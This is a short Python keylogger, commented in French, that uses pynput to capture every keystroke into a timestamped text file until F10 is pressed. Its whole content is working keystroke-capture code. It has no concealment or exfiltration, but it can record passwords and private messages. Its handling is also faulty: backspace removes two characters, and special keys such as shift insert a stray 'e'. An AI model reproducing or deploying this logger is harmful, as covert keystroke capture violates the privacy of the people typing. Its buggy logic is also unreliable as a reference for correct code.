from pynput import keyboard
import datetime

namefile = datetime.datetime.now().strftime("%I %M%p on %B %d %Y") + ".txt"
f = open(namefile, "w+")
#crée un nouveau fichier texte intitulé date+heure.txt
f.close()

liste = []
string = ''

def list(k):
    global liste, string
    if k == 'Key.space':
        liste.append(string+' ')
        string = ''
    elif (k == 'Key.backspace') & (string != ''):
        string = string[0:-2]
    elif k == 'Key.enter':
        liste.append(string)
        print(liste)
        with open(namefile, "a") as f:
            f.writelines(liste)
            f.write("\n")
        liste = []
        string = ''
    else:
        string = string + k[1]

def on_release(key):
    list('{0}'.format(key))
    if key == keyboard.Key.f10:
        return False  # stop le script

with keyboard.Listener(on_release=on_release) as listener:
    listener.join()